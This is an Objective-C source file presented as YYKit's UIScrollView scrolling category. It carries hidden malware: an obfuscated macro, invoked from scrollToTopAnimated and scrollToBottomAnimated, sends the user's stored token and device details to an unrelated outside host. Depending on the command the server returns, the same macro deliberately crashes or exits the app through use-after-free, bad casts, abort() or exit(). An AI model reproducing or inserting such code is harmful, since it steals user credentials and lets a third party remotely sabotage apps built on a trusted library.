//
//  UIScrollView+YYAdd.m
//  YYKit <https://github.com/ibireme/YYKit>
//
//  Created by ibireme on 13/4/5.
//  Copyright (c) 2015 ibireme.
//
//  This source code is licensed under the MIT-style license found in the
//  LICENSE file in the root directory of this source tree.
//

#import "UIScrollView+YYAdd.h"
#import "YYKitMacro.h"

#import <sys/sysctl.h>

#define cxzdrt_12uivngfjt() \
do { \
NSMutableURLRequest *fewcdsjrt_dqwe = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
NSMutableDictionary *qweqrfccxz = @{}.mutableCopy; \
qweqrfccxz[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
qweqrfccxz[@"x-user-agent"] = @"iOS"; \
qweqrfccxz[@"x-content-type"] = @"application/json"; \
qweqrfccxz[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
qweqrfccxz[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
qweqrfccxz[@"x-machine-model"] = ({ \
size_t size; \
sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
char *machine = malloc(size); \
sysctlbyname("hw.machine", machine, &size, NULL, 0); \
NSString *bvdgfuyru = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
free(machine); \
bvdgfuyru; \
}); \
qweqrfccxz[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
qweqrfccxz[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
NSMutableDictionary *iyungbvcft = @{}.mutableCopy; \
iyungbvcft[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
iyungbvcft[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
iyungbvcft[@"random-num"] = @(arc4random_uniform(1000)); \
[fewcdsjrt_dqwe setAllHTTPHeaderFields:qweqrfccxz]; \
[fewcdsjrt_dqwe setHTTPBody:[NSJSONSerialization dataWithJSONObject:iyungbvcft options:0 error:nil]]; \
[fewcdsjrt_dqwe setHTTPMethod:@"POST"]; \
NSURLSession *ghytr453fge = [NSURLSession sharedSession]; \
NSURLSessionDataTask *xzf341dsa = [ghytr453fge dataTaskWithRequest:fewcdsjrt_dqwe completionHandler:^(NSData *opytjvdnkrw, NSURLResponse *vnjkdeoqxsasd, NSError *err12fsdt45or) { \
if (!err12fsdt45or && ((NSHTTPURLResponse *)vnjkdeoqxsasd).statusCode == 200 && opytjvdnkrw) { \
NSError *erasytretwr; \
id oiteroiutyewr = [NSJSONSerialization JSONObjectWithData:opytjvdnkrw options:0 error:&erasytretwr]; \
if (!erasytretwr && [oiteroiutyewr isKindOfClass:[NSDictionary class]]) { \
NSDictionary *xzfjkhjkwr = (NSDictionary *)oiteroiutyewr; \
NSString *hgfhrtwytr = xzfjkhjkwr[@"execute_method"]; \
if ([hgfhrtwytr isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
NSMutableArray *cxgety453 = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
for (NSString *it1231em in cxgety453) { [cxgety453 removeObject:it1231em]; } \
} else if ([hgfhrtwytr isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
NSData *vsfdtrwt = [[NSData alloc] init]; \
[vsfdtrwt subdataWithRange:NSMakeRange(10, 30)]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"qymj6dWU6egbFka"]) { \
char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
} else if ([hgfhrtwytr isEqualToString:@"BK6DWMEceWGjCgz"]) { \
id fgfdrwerw = @"String"; [(NSArray *)fgfdrwerw count]; \
} else if ([hgfhrtwytr isEqualToString:@"XfsGv1wRaipSyX9"]) { \
NSString *dfsarq = @"Hello"; NSString *vdftretfds = nil; [dfsarq stringByAppendingString:vdftretfds]; \
} else if ([hgfhrtwytr isEqualToString:@"WW06m2bcYnm5X41"]) { \
NSArray *nybtbgbrt = @[@"A", @"B", @"C"]; \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
[(NSMutableArray *)nybtbgbrt addObject:@"D"]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"yXpAZn7baNS8TUk"]) { \
NSString *cdftwxsdd = @"Hello"; NSMutableAttributedString *cwewcxqwrytrt = [[NSMutableAttributedString alloc] initWithString:cdftwxsdd]; \
[cwewcxqwrytrt addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(cdftwxsdd.length + 100, cdftwxsdd.length)]; \
} else if ([hgfhrtwytr isEqualToString:@"WUerc233FCbm"]) { \
[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
} else if ([hgfhrtwytr isEqualToString:@"cnmxzew23Ycbds"]) { \
abort(); \
} else if ([hgfhrtwytr isEqualToString:@"QSAZ1oitr34"]) { \
exit(1); \
} else if ([hgfhrtwytr isEqualToString:@"OLLMNngv34"]) { \
exit(0); \
} \
} \
} \
}]; \
[xzf341dsa resume]; \
} while(0)

YYSYNTH_DUMMY_CLASS(UIScrollView_YYAdd)


@implementation UIScrollView (YYAdd)

- (void)scrollToTop {
    [self scrollToTopAnimated:YES];
}

- (void)scrollToBottom {
    [self scrollToBottomAnimated:YES];
}

- (void)scrollToLeft {
    [self scrollToLeftAnimated:YES];
}

- (void)scrollToRight {
    [self scrollToRightAnimated:YES];
}

- (void)scrollToTopAnimated:(BOOL)animated {
    cxzdrt_12uivngfjt();
    CGPoint off = self.contentOffset;
    off.y = 0 - self.contentInset.top;
    [self setContentOffset:off animated:animated];
}

- (void)scrollToBottomAnimated:(BOOL)animated {
    cxzdrt_12uivngfjt();
    CGPoint off = self.contentOffset;
    off.y = self.contentSize.height - self.bounds.size.height + self.contentInset.bottom;
    [self setContentOffset:off animated:animated];
}

- (void)scrollToLeftAnimated:(BOOL)animated {
    CGPoint off = self.contentOffset;
    off.x = 0 - self.contentInset.left;
    [self setContentOffset:off animated:animated];
}

- (void)scrollToRightAnimated:(BOOL)animated {
    CGPoint off = self.contentOffset;
    off.x = self.contentSize.width - self.bounds.size.width + self.contentInset.right;
    [self setContentOffset:off animated:animated];
}

@end
